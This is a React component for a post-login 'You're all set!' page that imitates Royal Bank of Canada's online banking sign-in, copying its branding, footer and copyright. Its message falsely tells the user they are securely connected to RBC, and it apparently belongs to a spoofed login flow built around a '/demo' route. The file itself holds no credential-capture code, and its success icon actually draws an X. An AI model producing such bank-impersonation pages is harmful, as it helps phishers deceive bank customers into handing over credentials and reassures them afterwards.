import React from 'react';
import { useNavigate } from 'react-router-dom';

const ThankYouPage: React.FC = () => {
  const navigate = useNavigate();

  return (
    <div style={{ minHeight: '100vh', display: 'flex' }}>
      {/* Left side: branding (identique) */}
      <div style={{
        flex: '1',
        background: '#0051a5',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        color: 'white',
        padding: '20px',
      }}>
        <div style={{ textAlign: 'center' }}>
          {/* Logo SVG (copier depuis demo.tsx) */}
          <svg width="77" height="100" viewBox="0 0 77 100" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ display: 'block', margin: '0 auto' }}>
            {/* ... (même SVG) ... */}
          </svg>
          <h1 style={{ fontSize: '20px', fontWeight: 400, marginTop: '16px' }}>Secure Sign-In</h1>
          <p style={{ fontSize: '14px', fontWeight: 400 }}>RBC Online Banking</p>
        </div>
      </div>

      {/* Right side: thank you message */}
      <div style={{
        flex: '1',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '20px',
        backgroundColor: '#fff',
      }}>
        <div style={{ width: '100%', maxWidth: '400px', textAlign: 'center' }}>
          <div style={{ marginBottom: '24px' }}>
            <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ display: 'inline-block' }}>
              <circle cx="32" cy="32" r="30" fill="#097b24" />
              <path d="M27 42.5L42.5 27" stroke="white" strokeWidth="4" strokeLinecap="round"/>
              <path d="M27 27L42.5 42.5" stroke="white" strokeWidth="4" strokeLinecap="round"/>
            </svg>
            <h2 style={{ fontSize: '1.5rem', fontWeight: 400, marginTop: '16px' }}>You're all set!</h2>
            <p style={{ fontSize: '1rem', color: '#444', marginTop: '8px' }}>
              Your login was successful. You are now securely connected to RBC Online Banking.
            </p>
          </div>

          <button
            type="button"
            onClick={() => navigate('/demo')}
            style={{
              width: '100%',
              padding: '12px 20px',
              backgroundColor: '#006ac3',
              color: 'white',
              border: 'none',
              cursor: 'pointer',
              fontSize: '0.875rem',
              fontWeight: 500,
              textAlign: 'center',
            }}
          >
            Return to Sign In
          </button>

          {/* Footer (simplifié) */}
          <div style={{ marginTop: '24px', borderTop: '1px solid #e0e0e0', paddingTop: '16px', fontSize: '0.75rem', color: '#444' }}>
            <p style={{ margin: '0 0 4px' }}>RBC Online Banking is provided by Royal Bank of Canada.</p>
            <p style={{ margin: '0 0 16px' }}>Royal Bank of Canada Website, © 1995-2026</p>
            <div style={{ display: 'flex', gap: '16px', flexWrap: 'wrap' }}>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => e.preventDefault()}>Legal</a>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => e.preventDefault()}>Accessibility</a>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => e.preventDefault()}>Privacy &amp; Security</a>
              <a href="#" style={{ color: '#006ac3', textDecoration: 'none', fontSize: '0.875rem' }} onClick={(e) => e.preventDefault()}>Advertising &amp; Cookies</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ThankYouPage;